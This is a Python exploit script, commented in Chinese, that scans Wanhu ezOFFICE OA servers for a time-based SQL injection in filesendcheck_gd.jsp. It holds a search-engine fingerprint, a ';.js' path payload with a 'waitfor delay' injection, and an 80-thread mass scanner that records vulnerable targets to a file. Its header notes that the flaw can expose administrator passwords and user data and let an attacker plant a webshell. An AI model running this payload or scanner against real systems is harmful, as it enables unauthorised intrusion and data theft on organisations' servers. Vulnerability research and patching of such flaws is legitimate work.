# 万户 ezOFFICE filesendcheck_gd.jsp SQL注入漏洞
# app="万户ezOFFICE协同管理平台"
# 产品简介:万户OA ezoffice是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公软件产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。
# 漏洞概述:万户 ezOFFICE filesendcheck_gd.jsp.jsp 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
# GET/SQL延时注入

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def bunner():
    test = """                                                            
    \x1b[38m                      /$$$$$$  /$$$$$$$$ /$$$$$$$$ /$$$$$$  /$$$$$$  /$$$$$$$$
    \x1b[36m                     /$$__  $$| $$_____/| $$_____/|_  $$_/ /$$__  $$| $$_____/
    \x1b[34m  /$$$$$$  /$$$$$$$$| $$  \ $$| $$      | $$        | $$  | $$  \__/| $$      
    \x1b[35m /$$__  $$|____ /$$/| $$  | $$| $$$$$   | $$$$$     | $$  | $$      | $$$$$   
    \x1b[31m| $$$$$$$$   /$$$$/ | $$  | $$| $$__/   | $$__/     | $$  | $$      | $$__/   
    \x1b[31m| $$_____/  /$$__/  | $$  | $$| $$      | $$        | $$  | $$    $$| $$      
    \x1b[33m|  $$$$$$$ /$$$$$$$$|  $$$$$$/| $$      | $$       /$$$$$$|  $$$$$$/| $$$$$$$$
    \x1b[33m \_______/|________/ \______/ |__/      |__/      |______/ \______/ |________/
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
            --author:Kucei  --Vession:万户 ezOFFICE filesendcheck_gd.jsp SQL
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
\x1b[0m"""
    print(test)

def main():
    bunner()
    # 初始化
    parser = argparse.ArgumentParser("万户 ezOFFICE filesendcheck_gd.jsp SQL")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 创建一个列表接收 文件夹的URL
        url_list = []
        with open(args.file,'r') as fp:
            # 遍历文件夹内的URL
            for url in fp.readlines():
                # append 往列表添加元素
                url_list.append(url.strip())
        # 创建线性池
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else :
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    url_payload1 = "/defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;"
    url_payload2 = "/defaultroot/modules/govoffice/gov_documentmanager/filesendcheck_gd.jsp;.js?recordId=1;waitfor+delay+'0:0:5'--"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    try :
        response1 = requests.get(url=target+url_payload1,headers=headers,verify=False,timeout=5)
        response2 = requests.get(url=target+url_payload2,headers=headers,verify=False,timeout=7)
        # print(response.status_code)
        # print(response.text)
        time1 = response1.elapsed.total_seconds()
        time2 = response2.elapsed.total_seconds()
        if response1.status_code == 200 and time2 - time1 >= 4.5:
            print( f"[+] {target} 存在漏洞")
            with open('万户_ezOFFICE_filesendcheck_gd.jsp_SQL.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except :
        print(target+"--站点连接异常--")
if __name__ == '__main__':
    main()